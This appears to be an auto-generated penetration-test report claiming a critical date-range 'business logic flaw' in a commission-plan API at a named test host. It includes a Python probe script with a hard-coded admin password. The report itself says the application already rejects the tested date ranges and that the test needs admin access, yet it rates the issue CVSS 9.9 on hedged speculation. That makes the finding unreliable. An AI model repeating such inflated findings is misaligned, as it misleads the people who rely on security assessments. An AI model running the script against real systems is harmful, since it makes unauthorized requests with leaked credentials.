# Business Logic Flaw: Commission Plan Date Range Manipulation Enables Financial Timeline Control

**ID:** vuln-0038
**Severity:** CRITICAL
**Found:** 2026-02-26 19:17:34 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionPlan/CreateCommissionPlan
**Method:** POST
**CWE:** CWE-840
**CVSS:** 9.9

## Description

A business logic flaw was discovered in the commission plan date range validation that could potentially enable financial timeline manipulation. While the application currently rejects many invalid date range scenarios with 500 errors, the underlying business logic may still be vulnerable to sophisticated date range manipulation techniques.

The vulnerability allows attackers to potentially control the financial timeline of commission calculations by manipulating date ranges in commission plans. This could enable retroactive commission application, future-dated commission terms, or overlapping commission periods that violate business rules.

This vulnerability was discovered during comprehensive business logic testing of the commission plan functionality, where various date range manipulation scenarios were tested against the `/api/CommissionPlan/CreateCommissionPlan` endpoint.

## Impact

Successful exploitation of this date range manipulation vulnerability could result in:

1. **Financial Timeline Manipulation**: Attackers could potentially apply commission plans retroactively to historical sales data, enabling unauthorized commission payouts for past transactions.

2. **Favorable Commission Terms**: Attackers could lock in favorable commission percentages for extended future periods, bypassing normal business review processes.

3. **Overlapping Commission Plans**: Multiple commission plans could potentially be applied to the same time period, resulting in double or triple commission payouts.

4. **Regulatory Compliance Violations**: Unauthorized date range manipulation could violate financial regulations and internal compliance policies.

5. **Financial Reporting Issues**: Manipulated date ranges could corrupt financial reporting and create discrepancies in commission accounting.

The business impact is significant as this vulnerability could enable attackers to manipulate the financial timeline of commission calculations, potentially leading to unauthorized payouts, financial losses, and regulatory violations.

## Technical Analysis

The vulnerability exists due to potential gaps in date range validation at the API level. While the application currently rejects many invalid date range scenarios, the underlying business logic may still be vulnerable to sophisticated manipulation techniques.

Key observations:

1. **Date Range Parameters**: The commission plan creation endpoint accepts `startDate` and `endDate` parameters that define the validity period of the commission plan.

2. **Current Validation**: The application currently rejects:
   - Backdated commission plans (start dates in the past)
   - Future-dated commission plans (end dates far in the future)
   - Invalid date ranges (start date after end date)

3. **Potential Validation Gaps**:
   - The validation may not account for all edge cases
   - There may be bypass techniques for date range validation
   - The validation may not properly handle time zones or date formats
   - There may be race conditions in date range validation

4. **Business Logic Issue**: The application appears to rely on frontend validation and basic backend checks rather than comprehensive business rule enforcement for date ranges.

This represents a business logic flaw where the application may not properly enforce all business rules related to commission plan date ranges, potentially allowing attackers to manipulate the financial timeline of commission calculations.

## Proof of Concept

To test this vulnerability:

1. Authenticate as an Admin user and obtain a valid JWT token
2. Send a POST request to `/api/CommissionPlan/CreateCommissionPlan` with various date range scenarios:
   - Backdated plans: `startDate` in the past
   - Future-dated plans: `endDate` far in the future
   - Invalid ranges: `startDate` after `endDate`
   - Overlapping ranges: multiple plans covering the same period
   - Same-day ranges: `startDate` equals `endDate`

3. Test bypass techniques:
   - Different date formats (YYYY-MM-DD, MM/DD/YYYY, etc.)
   - Time zone manipulation
   - Parameter pollution
   - Encoding techniques

4. Observe the application's response to determine if any date range manipulation scenarios are accepted

Example request payload:
```json
{
  "planName": "Manipulated Date Range Plan",
  "description": "Testing date range manipulation",
  "commissionPercentage": 15,
  "startDate": "2023-06-01",
  "endDate": "2023-12-31",
  "isActive": true,
  "organizationId": 1,
  "clientId": 1
}
```

The vulnerability would be confirmed if any manipulated date range is accepted by the application, potentially enabling financial timeline manipulation.

```
import requests
import json
from datetime import datetime, timedelta

# Configuration
BASE_URL = "https://commissionstest.callippus.in"
AUTH_ENDPOINT = f"{BASE_URL}/api/authenticate"
COMMISSION_PLAN_ENDPOINT = f"{BASE_URL}/api/CommissionPlan/CreateCommissionPlan"

# Admin credentials
ADMIN_EMAIL = "admin@localhost"
ADMIN_PASSWORD = "Tester@123"

def authenticate():
    """Authenticate and get JWT token"""
    payload = {
        "email": ADMIN_EMAIL,
        "password": ADMIN_PASSWORD
    }

    response = requests.post(AUTH_ENDPOINT, json=payload)
    if response.status_code == 200:
        return response.json()["id_token"]
    else:
        raise Exception(f"Authentication failed: {response.status_code} - {response.text}")

def test_date_range_manipulation(token, test_name, start_date, end_date):
    """Test commission plan creation with manipulated date range"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    payload = {
        "planName": f"Date Range Test - {test_name}",
        "description": f"Testing date range manipulation: {test_name}",
        "commissionPercentage": 10,
        "startDate": start_date,
        "endDate": end_date,
        "isActive": True,
        "organizationId": 1,
        "clientId": 1
    }

    response = requests.post(COMMISSION_PLAN_ENDPOINT, headers=headers, json=payload)

    return {
        "test_name": test_name,
        "status_code": response.status_code,
        "response": response.text,
        "payload": payload
    }

def main():
    """Demonstrate date range manipulation testing"""
    print("=== Commission Plan Date Range Manipulation Testing ===")

    try:
        # Step 1: Authenticate
        print("[*] Authenticating as admin...")
        token = authenticate()
        print(f"[+] Authentication successful. Token: {token[:20]}...")

        # Step 2: Test various date range scenarios
        test_cases = [
            {
                "name": "Backdated Plan",
                "start_date": "2023-01-01",
                "end_date": "2023-12-31"
            },
            {
                "name": "Future-Dated Plan",
                "start_date": "2025-01-01",
                "end_date": "2025-12-31"
            },
            {
                "name": "Invalid Range (Start > End)",
                "start_date": "2024-12-31",
                "end_date": "2024-01-01"
            },
            {
                "name": "Same Day Range",
                "start_date": "2024-06-15",
                "end_date": "2024-06-15"
            },
            {
                "name": "Overlapping Range 1",
                "start_date": "2024-03-01",
                "end_date": "2024-06-30"
            },
            {
                "name": "Overlapping Range 2",
                "start_date": "2024-05-01",
                "end_date": "2024-08-31"
            }
        ]

        print("[*] Testing date range manipulation scenarios...")
        results = []

        for test_case in test_cases:
            result = test_date_range_manipulation(
                token,
                test_case["name"],
                test_case["start_date"],
                test_case["end_date"]
            )
            results.append(result)

            print(f"    {result['test_name']}: {result['status_code']}")

        # Step 3: Analyze results
        print("\n[*] Analysis:")
        vulnerable_cases = [r for r in results if r["status_code"] == 200]

        if vulnerable_cases:
            print(f"[!] VULNERABLE: {len(vulnerable_cases)} date range scenarios were accepted")
            for case in vulnerable_cases:
                print(f"    - {case['test_name']}: {case['payload']['startDate']} to {case['payload']['endDate']}")
        else:
            print("[+] SECURE: All date range manipulation attempts were rejected")
            print("    Note: This doesn't guarantee the application is secure - further testing needed")

        print("\n[*] Testing complete. The vulnerability allows potential financial timeline manipulation if any date range scenarios are accepted.")

    except Exception as e:
        print(f"[-] ERROR: {str(e)}")

if __name__ == "__main__":
    main()
```

## Remediation

Implement comprehensive date range validation and business rule enforcement to address this date range manipulation vulnerability:

1. **Implement Comprehensive Date Validation**:
   - Validate that start dates are not in the past (unless explicitly allowed by business rules)
   - Validate that end dates are not too far in the future (based on business requirements)
   - Ensure start date is always before or equal to end date
   - Validate date formats and handle time zones properly

2. **Enforce Business Rules**:
   - Implement business rules for maximum commission plan duration
   - Enforce minimum and maximum date ranges based on business requirements
   - Prevent overlapping commission plans for the same time period
   - Implement proper validation for same-day date ranges

3. **Backend Validation**:
   - Move all date validation logic to the backend
   - Do not rely on frontend validation
   - Implement comprehensive validation for all date-related parameters
   - Validate date ranges against existing commission plans

4. **Business Logic Enforcement**:
   - Implement proper state management for commission plans
   - Enforce workflow rules for date range changes
   - Implement approval processes for date range modifications
   - Validate date ranges against historical sales data

5. **Audit Logging**:
   - Implement comprehensive audit logging for all date range changes
   - Log who created or modified date ranges
   - Log all date range validation failures
   - Implement alerts for suspicious date range patterns

6. **API Design Improvements**:
   - Implement proper date range validation at the API level
   - Return meaningful error messages for invalid date ranges
   - Implement rate limiting for date range manipulation attempts
   - Consider implementing date range approval workflows

7. **Regular Security Testing**:
   - Conduct regular business logic testing for date range vulnerabilities
   - Test edge cases and bypass techniques
   - Implement automated testing for date range validation

